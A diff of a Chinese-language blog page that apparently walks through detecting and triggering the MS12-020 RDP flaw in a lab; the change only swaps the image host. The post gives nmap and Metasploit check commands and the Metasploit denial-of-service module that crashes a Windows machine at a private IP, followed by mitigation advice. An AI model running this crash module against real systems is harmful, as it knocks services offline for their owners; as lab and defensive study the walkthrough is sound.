@@ -6,19 +6,19 @@
 <p>利用 nmap 扫描后发现目标机器开放了 3389 端口，于是利用 ms12-020 脚本对目标系统进行进一步探测，确认目标系统存在 ms12-020 漏洞：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap --script rdp-vuln-ms12-020.nse 192.168.0.203</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2019/06/04/ms12020/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-27%20%e4%b8%8b%e5%8d%884.43.55.png" alt="屏幕快照 2019-12-27 下午4.43.55"></p>
+<p><img src="//mucfo.cn/2019/06/04/ms12020/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-27%20%e4%b8%8b%e5%8d%884.43.55.png" alt="屏幕快照 2019-12-27 下午4.43.55"></p>
 <p>利用 msf 进行探测，确认目标系统存在 ms12-020 漏洞：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt; use auxiliary/scanner/rdp/ms12_020_check</span><br><span class="line">msf&gt; set RHOST 192.168.0.203</span><br><span class="line">msf&gt; run</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2019/06/04/ms12020/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-27%20%e4%b8%8b%e5%8d%884.47.04.png" alt="屏幕快照 2019-12-27 下午4.47.04"></p>
+<p><img src="//mucfo.cn/2019/06/04/ms12020/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-27%20%e4%b8%8b%e5%8d%884.47.04.png" alt="屏幕快照 2019-12-27 下午4.47.04"></p>
 </li>
 <li><p>⚙️ <strong>漏洞利用</strong></p>
 <p>直接上 msf 死亡蓝屏：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt; use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br><span class="line">msf&gt; set RHOST 192.168.0.203</span><br><span class="line">msf&gt; run</span><br></pre></td></tr></table></figure>
 
-<p><img src="//naykcin.top/2019/06/04/ms12020/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-27%20%e4%b8%8b%e5%8d%884.50.18.png" alt="屏幕快照 2019-12-27 下午4.50.18"></p>
+<p><img src="//mucfo.cn/2019/06/04/ms12020/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-27%20%e4%b8%8b%e5%8d%884.50.18.png" alt="屏幕快照 2019-12-27 下午4.50.18"></p>
 <p>目标系统蓝屏宕机：</p>
-<p><img src="//naykcin.top/2019/06/04/ms12020/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-27%20%e4%b8%8b%e5%8d%884.19.44.png" alt="屏幕快照 2019-12-27 下午4.19.44"></p>
+<p><img src="//mucfo.cn/2019/06/04/ms12020/%e5%b1%8f%e5%b9%95%e5%bf%ab%e7%85%a7%202019-12-27%20%e4%b8%8b%e5%8d%884.19.44.png" alt="屏幕快照 2019-12-27 下午4.19.44"></p>
 </li>
 </ol>
 <h3 id="📍-修复建议"><a href="#📍-修复建议" class="headerlink" title="📍 修复建议"></a>📍 修复建议</h3><p>1、启用 Windows 防火墙或者限制 3389 端口开放。</p>
